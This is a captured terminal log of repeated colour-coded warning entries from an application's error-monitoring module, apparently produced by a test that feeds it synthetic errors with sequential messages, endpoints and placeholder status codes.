WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.946967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4818'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947015Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4819'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947063Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4820'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947112Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4821'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947160Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4822'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947207Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4823'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947254Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4824'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947302Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4825'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947349Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4826'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947397Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4827'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947444Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4828'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947491Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4829'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947539Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4830'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947586Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4831'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947634Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4832'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947682Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4833'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947730Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4834'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947852Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4835'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947928Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4836'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.947985Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4837'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948037Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4838'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948091Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4839'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948141Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4840'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948190Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4841'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948242Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4842'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948300Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4843'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948355Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4844'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948407Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4845'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948458Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4846'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948508Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4847'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948558Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4848'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948608Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m97[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4849'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4850'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948710Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4851'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948760Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4852'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948808Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4853'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948857Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4854'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948905Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4855'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.948954Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4856'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.949001Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m98[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 4857'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
